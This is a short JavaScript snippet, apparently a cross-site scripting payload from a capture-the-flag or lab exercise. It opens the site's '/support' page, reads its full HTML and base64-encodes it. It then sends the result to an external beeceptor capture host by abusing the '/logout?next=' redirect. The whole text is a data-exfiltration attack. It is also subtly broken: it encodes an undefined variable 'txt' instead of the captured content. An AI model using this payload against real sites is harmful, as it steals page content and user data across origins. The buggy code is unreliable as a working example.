const a = window.open("/support");

setTimeout(() => {
  try {
    const content = a.document.documentElement.outerHTML; 
    console.log("Contenu de /support :", content);
    const encoded = btoa(txt);
    document.location = "/logout?next=https://skavens.free.beeceptor.com/xxx?" + encoded;
  } catch (err) {
    console.error("Impossible d’accéder au contenu :", err);
  }
}, 1500);
